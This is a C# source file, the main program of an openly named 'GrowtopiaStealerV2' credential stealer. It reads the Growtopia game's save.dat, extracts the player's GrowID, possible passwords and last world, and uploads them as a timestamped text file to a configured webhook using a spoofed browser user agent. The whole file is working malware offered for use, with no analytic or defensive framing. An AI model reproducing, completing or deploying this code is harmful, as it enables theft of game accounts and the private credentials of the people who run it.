using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace GrowtopiaStealerV2
{
    static class Program
    {

        static void Main()
        {
            if (File.Exists(Growtopia.Growtopia.dirPath + @"\save.dat"))
            {
                string data = String.Join(Environment.NewLine, "GrowID: " + Growtopia.Growtopia.GrowID() + "\nPossible Passwords: " + Growtopia.Growtopia.Password(), "Last World: " + Growtopia.Growtopia.LastWorld());
                byte[] data_bytes = Encoding.ASCII.GetBytes(data);

                MemoryStream MemoryStream = new MemoryStream(data_bytes, 0, data.Length);
                byte[] Data = new byte[data_bytes.Length];
                MemoryStream.Read(Data, 0, Data.Length);
                MemoryStream.Close();

                HttpWebResponse WebResponse = FormUpload.MultipartFormDataPost(Config.wbhk, "Mozilla/5.0 (X11; Linux i686; rv:97.0) Gecko/20100101 Firefox/97.0", new Dictionary<string, object> { { "file", new FormUpload.FileParameter(Data, DateTime.Now.ToString("MM/dd/yyyy hh:mm:ss") + ".txt", " ") } });

                WebResponse.Close();
            }
        }
    }
}